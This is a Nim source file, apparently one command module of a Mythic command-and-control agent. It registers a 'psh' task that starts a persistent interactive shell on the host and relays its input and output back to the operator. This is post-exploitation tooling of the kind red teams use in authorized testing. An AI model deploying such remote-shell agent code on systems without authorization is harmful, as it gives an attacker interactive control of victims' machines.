## psh — Persistent interactive shell.
## Spawns a shell process and registers it with the jobs manager.
## The main agent loop handles interact messages (stdin/special keys)
## and collects stdout/stderr to send back to Mythic.
import std/[os, osproc, json]
import ../types
import ../jobs
import ./registry

proc pshExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
  when defined(windows):
    let shellRaw = params{"shell"}.getStr("")
    let shell = if shellRaw.len > 0: shellRaw else: "cmd.exe"
  else:
    let shellRaw = params{"shell"}.getStr("")
    let shell = if shellRaw.len > 0: shellRaw else: getEnv("SHELL", "/bin/bash")

  try:
    let process = startProcess(
      shell,
      workingDir = state.cwd,
      options = {poUsePath, poStdErrToStdOut},
    )
    if not jobStart(taskId, process):
      return TaskResult(
        output: "Too many concurrent interactive shells (max " & $MaxJobs & ")",
        status: "error",
        completed: true,
      )
    return TaskResult(
      output: "Interactive shell started — PID " & $process.processID,
      status: "success",
      completed: false,  ## task stays "running" until the shell exits
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initPsh*() =
  register("psh", pshExecute)
